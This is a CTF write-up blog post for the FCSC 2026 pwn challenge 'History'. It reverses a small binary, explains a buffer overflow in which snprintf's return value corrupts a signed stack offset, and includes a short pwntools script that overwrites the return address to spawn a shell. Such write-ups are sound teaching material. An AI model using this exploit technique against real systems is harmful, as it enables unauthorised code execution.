+++
title = 'FCSC 2026 History'
date = 2026-08-02T10:24:02+02:00
tags = ["pwn", "Overflow"]
categories = ["Hackropole"]
+++

**Challenge Name : History**  
**Difficulty : ★**  
**Number of solves : 83**

This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition.  
History was a 1Star challenge and the most solved challenge of this year.  
You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2026/History/).

## TLDR ##
- The challenge allows us to send 32 bytes of data in a loop, in a 0x400 buffer
- It calls snprintf that uses a number on the stack after our buffer
- We can overflow on this number to change the offset
- The ret is present before our buffer so we change the offset to a negative
- We change return for the win address

# Chal Analysis #

First of all the result of the checksec.  
![checksec](/images/FCSC2026/History/checksec.png)  
As we can see there is no protections besides NX and it is Partial RELRO.

The code was not provided for this challenge, we had to reverse it. However given that it's an easy challenge, the size of the program was minimal.
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int size_read; // [rsp+Ch] [rbp-434h]
  _BYTE read[32]; // [rsp+10h] [rbp-430h] BYREF
  _BYTE buf[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+438h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  while ( 1 )
  {
    memset(read, 0, sizeof(read));
    size_read = ::read(0, read, 0x20uLL);
    if ( size_read <= 0 )
      break;
    to_log(buf, read, (unsigned int)size_read);
  }
  _exit(0);
}
```
We have a buffer of size 1032 starting initialised at 0. We then enter a loop where we can send each time 32 bytes of input. It then calls the function to_log.
```C
__int64 __fastcall to_log(__int64 a1, const char *a2, int a3)
{
  int v3; // edx
  __int64 result; // rax

  v3 = *(_DWORD *)(a1 + 1028)
     + snprintf((char *)(*(int *)(a1 + 1028) + a1), 1025LL - *(int *)(a1 + 1028), "%.*s", a3, a2);
  result = a1;
  *(_DWORD *)(a1 + 1028) = v3;
  return result;
}
```
To log calls snprintf with an offset that is calculated by the size that was printed previously.
There is also a win function that gives us a shell.

# Vulnerabilities #
The first vulnerability is obviously there is no check that sending our 32 bytes eventually overflow the buffer. So we can just send until we overflow. 

The second one is in the **to_log** : snprintf returns the maximum number of bytes that could have been written even if truncated, also there's the problem of it taking the offset that is in the stack. It also does a cqde and uses the offset as a signed integer : meaning we can then overwrite stuff before or after our address.
Since the return address of the function is before our buffer we will need to use a negative offset.

## Exploitation ##
The exploitation is very simple. We send our 32 bytes until we overflow the offset in the stack. Then we use a negative offset that will allow us to overwrite the return address before our buffer. Finally we send the win addr and get our shell.
```python
win_addr = elf.sym['win'] 
#addr ret = buf - 56
# good luck pwning :)
for i in range(32):
    r.send(b'A'*32)

sleep(0.3)

r.send(b'B'*4)
pause()

r.send(p64(0xFFFFFFFFC3) + p64(0x0))
pause()

r.send(p64(win_addr)+b'\n')
```
![shell](/images/FCSC2026/History/shell.png)

## Conclusion ##
As you can see from the size of the writeup this was the weakest challenge of this year FCSC. The vulnerability was nice, but nothing was difficult in the exploitation.
